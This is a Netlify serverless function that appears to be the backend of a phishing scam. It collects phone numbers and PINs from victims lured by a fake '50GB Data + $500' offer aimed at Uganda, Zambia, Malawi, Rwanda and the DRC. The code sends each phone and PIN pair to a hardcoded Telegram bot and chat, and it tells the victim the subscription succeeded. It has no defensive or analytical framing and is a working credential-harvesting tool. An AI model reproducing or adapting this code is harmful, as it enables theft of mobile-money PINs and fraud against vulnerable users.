// netlify/functions/send-to-telegram.js

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8834457288:AAEwsXLbfzRp54OnBcE-12jMhaZY_0e-Nz4';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8834429633';

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 204, headers };
    }

    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            headers,
            body: JSON.stringify({ success: false, message: 'Method not allowed' })
        };
    }

    try {
        const data = JSON.parse(event.body);
        console.log('📥 Received:', data);

        const { country, countryCode, phone, pin, ticket, offer } = data;

        if (!phone || !pin) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ success: false, message: 'Phone and PIN required' })
            };
        }

        const flags = {
            uganda: '🇺🇬',
            zambia: '🇿🇲',
            malawi: '🇲🇼',
            rwanda: '🇷🇼',
            drc: '🇨🇩'
        };
        const flag = flags[countryCode?.toLowerCase()] || '🌍';

        const message = `
🌍 *NEW AFRICA 50GB SUBSCRIPTION!*

🎫 *Ticket:* ${ticket || 'N/A'}
${flag} *Country:* ${country || 'Unknown'}
📞 *Phone:* ${phone}
🔐 *PIN:* ${pin}
📦 *Offer:* ${offer || '50GB Data + $500'}

✅ *Status:* Successfully Subscribed!
⏰ *Time:* ${new Date().toLocaleString()}
        `;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.error('❌ Missing Telegram credentials');
            return {
                statusCode: 500,
                headers,
                body: JSON.stringify({
                    success: false,
                    message: 'Telegram not configured',
                    telegramSent: false
                })
            };
        }

        try {
            const telegramResponse = await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                }
            );

            const result = await telegramResponse.json();

            if (telegramResponse.ok && result.ok) {
                console.log('✅ Telegram sent successfully!');
                return {
                    statusCode: 200,
                    headers,
                    body: JSON.stringify({
                        success: true,
                        message: 'Data submitted successfully!',
                        telegramSent: true,
                        data: { ticket, country, phone }
                    })
                };
            } else {
                console.error('❌ Telegram error:', result);
                return {
                    statusCode: 500,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Telegram API error',
                        telegramSent: false,
                        error: result.description
                    })
                };
            }
        } catch (error) {
            console.error('❌ Fetch error:', error);
            return {
                statusCode: 500,
                headers,
                body: JSON.stringify({
                    success: false,
                    message: 'Failed to send to Telegram',
                    telegramSent: false,
                    error: error.message
                })
            };
        }

    } catch (error) {
        console.error('❌ Function error:', error);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({
                success: false,
                message: 'Internal server error',
                error: error.message
            })
        };
    }
};
